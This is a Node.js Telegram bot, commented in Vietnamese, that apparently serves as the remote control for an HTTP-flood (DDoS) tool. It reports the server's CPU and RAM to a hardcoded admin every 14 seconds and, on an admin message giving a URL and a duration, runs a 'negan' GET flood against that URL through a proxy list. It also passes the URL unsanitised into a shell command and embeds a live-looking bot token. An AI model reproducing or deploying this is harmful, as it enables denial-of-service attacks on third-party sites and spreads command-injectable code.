const TelegramBot = require('node-telegram-bot-api'), { exec } = require('child_process'), os = require('os');
const token = '8129263243:AAETi5Zj1r2aC_LjrnKAIkf62yym7QBx-VI', bot = new TelegramBot(token, { polling: true }), adminId = 7371969470;

// Hàm lấy thông số CPU và RAM
const getSystemStats = () => {
    const totalMemory = os.totalmem(), freeMemory = os.freemem(), usedMemory = totalMemory - freeMemory, memoryUsagePercent = ((usedMemory / totalMemory) * 100).toFixed(2);
    const cpuUsagePercent = (os.cpus().reduce((acc, cpu) => {
        const total = Object.values(cpu.times).reduce((a, b) => a + b, 0), idle = cpu.times.idle;
        return acc + (100 - (idle / total) * 100);
    }, 0) / os.cpus().length).toFixed(2);
    return { memoryUsagePercent, cpuUsagePercent, totalMemory: (totalMemory / 1024 / 1024 / 1024).toFixed(0), freeMemory: (freeMemory / 1024 / 1024 / 1024).toFixed(0) };
};

// Gửi thông số CPU và RAM mỗi 14 giây
setInterval(() => {
    const stats = getSystemStats(), cpuFreePercent = (100 - parseFloat(stats.cpuUsagePercent)).toFixed(2);
    bot.sendMessage(adminId, `
Thông số đã sử dụng: 🚀 
- CPU đã sử dụng: ${stats.cpuUsagePercent}%
- RAM đã sử dụng: ${stats.memoryUsagePercent}%

Thông số còn trống: ❤️
- CPU còn trống: ${cpuFreePercent}%
- RAM còn trống: ${stats.freeMemory}GB
- Tổng RAM: ${stats.totalMemory}GB
    `);
}, 14000);

// Xử lý lệnh từ admin
bot.on('message', (msg) => {
    const chatId = msg.chat.id, text = msg.text;
    if (chatId !== adminId) return bot.sendMessage(chatId, 'Bạn không có quyền thực hiện lệnh này.');
    const parts = text.split(' ');
    if (parts.length !== 2 || !parts[0].startsWith('http')) return bot.sendMessage(chatId, 'Sai định dạng! Nhập theo: <URL> <time>.');
    const [host, time] = parts;
    if (!host.startsWith('http://') && !host.startsWith('https://')) return bot.sendMessage(chatId, 'URL không hợp lệ! Cần có http:// hoặc https://.');
    const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
    console.log(`[DEBUG] Lệnh được thực thi: ${command}`);
    exec(command, (error, stdout, stderr) => {
        if (error) console.error(`[DEBUG] Lỗi khi thực thi lệnh: ${error.message}`);
        if (stderr) console.error(`[DEBUG] Lỗi từ stderr: ${stderr}`);
        if (stdout) console.log(`[DEBUG] Kết quả từ stdout: ${stdout}`);
    });
    bot.sendMessage(chatId, `Lệnh đã được gửi Successfully: ${command}`);
});
